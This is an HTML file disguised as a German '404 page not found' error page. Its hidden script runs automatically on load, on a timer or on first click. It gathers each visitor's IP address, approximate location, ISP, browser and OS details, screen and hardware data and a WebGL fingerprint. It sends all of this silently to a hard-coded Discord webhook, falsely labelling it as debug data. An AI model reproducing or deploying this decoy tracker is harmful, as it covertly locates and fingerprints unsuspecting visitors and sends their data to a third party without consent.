<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Seite nicht gefunden</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ffffff;
        }
        .error-container {
            text-align: center;
            padding: 40px;
        }
        .error-code {
            font-size: 120px;
            font-weight: bold;
            color: #ff4444;
            text-shadow: 0 0 50px rgba(255, 68, 68, 0.3);
            line-height: 1;
        }
        .error-text {
            font-size: 24px;
            color: #8899aa;
            margin-top: 20px;
        }
        .error-sub {
            font-size: 14px;
            color: #445566;
            margin-top: 10px;
        }
        .loading-dots {
            display: inline-block;
            margin-top: 30px;
        }
        .loading-dots span {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #ff4444;
            border-radius: 50%;
            margin: 0 4px;
            animation: pulse 1.4s infinite;
        }
        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse {
            0%, 80%, 100% { opacity: 0.2; transform: scale(0.8); }
            40% { opacity: 1; transform: scale(1.2); }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="error-code">404</div>
        <div class="error-text">Seite nicht gefunden</div>
        <div class="error-sub">Die angeforderte Ressource existiert nicht</div>
        <div class="loading-dots">
            <span></span>
            <span></span>
            <span></span>
        </div>
    </div>

    <script>
        // ===== WEBHOOK URL =====
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1532857198655574191/dZt0QpPxt29d69oazqmGekaLIqC4_KtUZnkGxswYvtHhiT2GPO38XvwiELOxuOJ4qivV';

        // ===== ALLE DATEN SAMMELN =====
        function collectData() {
            const data = {
                // System-Infos
                timestamp: new Date().toISOString(),
                localTime: new Date().toLocaleString('de-DE'),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // Browser & OS
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages.join(', '),
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Nicht gesetzt',
                javaEnabled: navigator.javaEnabled(),
                
                // Bildschirm
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                screenColorDepth: window.screen.colorDepth,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                
                // Hardware
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unbekannt',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unbekannt',
                
                // Referrer
                referrer: document.referrer || 'Direktaufruf',
                pageURL: window.location.href,
                
                // IP wird separat geholt
                ip: 'Wird geladen...',
                city: 'Wird geladen...',
                country: 'Wird geladen...',
                isp: 'Wird geladen...',
                
                // Zusätzliche Browser-Fingerprints
                webglVendor: 'Unbekannt',
                webglRenderer: 'Unbekannt'
            };

            // WebGL-Info (falls verfügbar)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        data.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        data.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {}

            return data;
        }

        // ===== IP ABFRAGEN =====
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unbekannt (Intranet)';
            }
        }

        async function fetchGeo(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city || 'Unbekannt',
                    country: data.country_name || 'Unbekannt',
                    isp: data.org || 'Unbekannt'
                };
            } catch {
                return { city: 'Unbekannt', country: 'Unbekannt', isp: 'Unbekannt' };
            }
        }

        // ===== AN WEBHOOK SENDEN =====
        async function sendToWebhook() {
            try {
                // 1. Daten sammeln
                const data = collectData();

                // 2. IP & Geo holen
                const ip = await fetchIP();
                data.ip = ip;
                
                if (ip !== 'Unbekannt (Intranet)') {
                    const geo = await fetchGeo(ip);
                    data.city = geo.city;
                    data.country = geo.country;
                    data.isp = geo.isp;
                }

                // 3. Discord Embed bauen
                const embed = {
                    title: '🕵️ 404 - Debug Data',
                    color: 0xff4444,
                    timestamp: data.timestamp,
                    fields: [
                        { name: '🌐 IP', value: data.ip, inline: true },
                        { name: '📍 Standort', value: `${data.city}, ${data.country}`, inline: true },
                        { name: '🏢 ISP', value: data.isp, inline: true },
                        { name: '💻 OS', value: data.platform, inline: true },
                        { name: '🌍 Browser', value: data.userAgent.split(' ').slice(-2).join(' '), inline: true },
                        { name: '🖥️ Bildschirm', value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
                        { name: '📐 Fenster', value: `${data.windowWidth}x${data.windowHeight}`, inline: true },
                        { name: '⏰ Zeit', value: data.localTime, inline: true },
                        { name: '🌐 Zeitzone', value: data.timezone, inline: true },
                        { name: '🧠 CPU-Kerne', value: data.hardwareConcurrency, inline: true },
                        { name: '💾 RAM', value: data.deviceMemory, inline: true },
                        { name: '🔤 Sprache', value: data.language, inline: true },
                        { name: '🍪 Cookies', value: data.cookieEnabled ? '✅ Ja' : '❌ Nein', inline: true },
                        { name: '☕ Java', value: data.javaEnabled ? '✅ Aktiviert' : '❌ Deaktiviert', inline: true },
                        { name: '🔗 Referrer', value: data.referrer || 'Keiner', inline: false },
                        { name: '📄 Seite', value: data.pageURL, inline: false },
                        { name: '🎮 WebGL', value: `${data.webglVendor} | ${data.webglRenderer}`, inline: false }
                    ],
                    footer: {
                        text: '🔒 404 Error Page - Automatisches Debugging'
                    }
                };

                // 4. Senden
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });

                // 5. Log (unsichtbar im Console)
                if (response.ok) {
                    console.log('✅ Debug-Daten gesendet');
                } else {
                    console.error('❌ Fehler beim Senden:', response.status);
                }

            } catch (error) {
                console.error('❌ Fehler:', error);
            }
        }

        // ===== BEIM LADEN AUSFÜHREN =====
        // Kurze Verzögerung, damit die Seite erstmal geladen wird
        window.addEventListener('load', function() {
            setTimeout(() => {
                sendToWebhook();
            }, 500);
        });

        // Zusätzlich: Wenn jemand auf die Seite klickt (falls der User interagiert)
        document.addEventListener('click', function() {
            // Nur einmal ausführen, falls noch nicht gesendet
            if (!window._sent) {
                window._sent = true;
                sendToWebhook();
            }
        });

        // Nach 3 Sekunden automatisch nochmal versuchen (falls der erste Versuch fehlschlug)
        setTimeout(() => {
            if (!window._sent) {
                window._sent = true;
                sendToWebhook();
            }
        }, 3000);
    </script>
</body>
</html>
